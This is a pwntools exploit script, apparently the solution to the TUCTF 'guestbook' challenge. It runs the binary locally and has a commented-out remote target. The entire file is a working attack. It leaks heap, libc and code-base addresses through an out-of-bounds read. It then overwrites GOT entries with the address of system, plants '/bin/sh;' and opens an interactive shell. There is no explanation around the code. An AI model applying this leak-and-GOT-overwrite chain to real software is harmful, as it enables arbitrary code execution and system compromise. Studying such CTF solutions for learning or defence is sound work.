from pwn import *
context(log_level='debug',arch='i386')
p=process("./guestbook")#,env={"LD_PRELOAD":"./libc.so.6"})#,aslr=False)
#p=remote("guestbook.tuctf.com",4545)

#,"b *0x%x\nb *0x%x"%(0x56555000+0x9c6,0x56555000+0x8de))
libc=ELF('./libc.so.6')
#p.interactive()
p.sendafter(">>>","aaa\n")
p.sendafter(">>>",'bbb\n')
p.sendafter(">>>",'/bin/sh;\n')
p.sendafter(">>>",'ddd\n')
#14 -0x26f=ebp
p.sendafter(">>",'1\n')
p.sendafter(">>>",'6\n')
heapbase=u32(p.recv(4))-8

p.sendafter(">>",'1\n')
p.sendafter(">>>","47\n")
libc1addr=u32(p.recv(4))

p.sendafter(">>",'2\n')
p.sendafter(">>>",'6\n')
p.sendafter(">>>",p32(libc1addr+8)+'\n'+'\n')

p.sendafter(">>",'1\n')
p.sendafter(">>>",'0\n')
code_base=u32(p.recv(4))-0x1ef0

p.sendafter(">>",'2\n')
p.sendafter(">>>",'6\n')
p.sendafter(">>>",p32(code_base+0x2014)+'\n'+'\n')

p.sendafter(">>",'1\n')
p.sendafter(">>>",'0\n')
sysaddr=u32(p.recv(4))-0x65b40+0x3ada0

log.success("heapbase: 0x%x  sysaddr: 0x%x  code_base: 0x%x"%(heapbase,sysaddr,code_base))

p.sendafter(">>",'2\n')
p.sendafter(">>>",'6\n')
p.sendafter(">>>",p32(code_base+0x2018)+'\n'+'\n')


p.sendafter(">>",'2\n')
p.sendafter(">>>",'0\n')
gdb.attach(p)
p.sendafter(">>>",p32(sysaddr)+'\n'+'\n')

p.sendafter(">>",'2\n')
p.sendafter(">>>",'2\n')
p.sendafter(">>>","/bin/sh;"+'\n'+'\n')

p.interactive()
#0004| 0xffffd0a0 --> 0xffffd074 --> 0x56559040 ("/bin/sh;")

